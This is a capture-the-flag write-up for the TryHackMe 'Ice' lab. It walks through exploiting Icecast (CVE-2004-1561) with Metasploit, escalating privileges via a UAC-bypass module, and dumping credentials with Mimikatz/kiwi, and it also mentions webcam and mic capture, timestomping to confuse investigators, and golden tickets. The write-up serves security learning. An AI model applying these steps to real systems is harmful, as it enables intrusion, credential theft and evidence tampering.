---
title: Ice
date: 2020-05-26
hero: /images/content/posts/try-hack-me/ice.png
categories:
- try-hack-me
tags:
- windows
- nmap
- mimikatz
- CVE-2004-1561
- metasploit
---
## Tools

* nmap
* metasploit

## Walkthrough

First things first. Nmap scan. I used the command `sudo nmap -sV -A -sS $IP` then piped the output to `nmap/nmap.txt`. From the results it looks like there is a webserver open on port 8000 and port 5357. On port 800 there is an interesting software called Icecast running. Let's do some research about this. It looks like Icecast is a software that allows a computer to be a media server.

To learn about the vulnerability this machine has TryHackMe gave us a big hint. It told us that there is a vulnerability with the level 7.5 on cvedetails.com. There are two exploits with this level on cvedetails that deal with Icecast. The one we are looking for is CVE-2004-1561. Its type is execute code overflow. Now that we know what exploit this machine might fall victim too let's fire up metasploit and load out module in. To do this type `msfconsole` then `search icecast` and finally `use 0` because this exploit is the only on in metasploit for Icecast. Next we will use `show options` to see what we need in order to execute the exploit. Turns out the required option is RHOSTS. Now let's set the RHOSTS to our target IP. Use the command `set RHOSTS 10.10.220.176`. Finally lets run the exploit! Use the `exploit` command.

Now that we have a foothold we can being escalating our privileges. First TryHackMe asks what shell we are using. And for this exploit metasploit is nice enough to throw us into the `meterpreter` shell. Now we can take a look at the processes running on the machine. To do this we can run the command `ps` to see the current processes. Turns out that a user named 'Dark' is running Icecast. Now the build of Windows that this machine is running is 7601. I just took a look at my nmap scan to figure this out. We can also use the command `sysinfo`. This also tells us that the machine is on an 'x64' architecture. Now let's run `run post/multi/recon/local_exploit_suggester` which will suggest us some exploits to run against this machine. After running these are our results:

```
[+] 10.10.220.176 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.220.176 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.220.176 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.220.176 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.220.176 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.220.176 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.220.176 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.220.176 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

TryHackMe wants us to use the first one. Suspend the current session using CTRL-Z then use the command `use exploit/windows/local/bypassuac_eventvwr` to load the exploit. Then set the session to 1 using `set SESSION 1` (This might be different depending on how you used metasploit. If you need to check use the command `sessions`). Now that we have set the session we need to set the listener ip. We can type `ip addr` in the command line to get out TryHackMe address. Your TryHackMe IP should be the one under the `tun0` section. You can also check this in the access tab on the website. In my case my internal IP is `10.9.12.124`. Now run the exploit and connect to the newly created session using the command `sessions #`. Now that we have connected we can use the command `getprivs` to see what processes we have access to. One of these process should allow us to take ownership of files. Based on the list output from `getprivs` it looks like 'SeTakeOwnershipPrivilege' is what we are looking for. Now that we know how to gain access to what we want we need to do it.

Now that we are on the machine we are running on a process that is being run under the 'Dark' user. However even though we have escalated privileges as 'NT AUTHORITY\SYSTEM' we are not in an escalated process. To get to an escalated process we can use the `ps` command to see the processes running. Then we can migrate to a process that is running as NT AUTHORITY\SYSTEM. For this box we are going to pick the `spoolsv.exe` process because is it running on the same architecture that the lsass service is running. lsass is our target. Now let's migrate. On my box the `spoolsv.exe` process id is 1400 so I will use the command `migrate 1400` to move to that process. Next I am going to load in the meterpreter extension Mimikatz using the command `load kiwi`, kiwi being the Minikatz version. Minikatz will allow us to dump the passwords. To get the credentials use the command `creds_all`. We can get all the hashes using the command `hashdump`. We can also watch the user's screen using `screenshare` or listen to their microphone using the command `record_mic`. We can also change time stamps using the command `timestomp`. This could be used to confuse investigators after an attack. If we wanted to we could also create a 'golden ticket' with Minikatz that allows us to easily authenticate other users on the system.
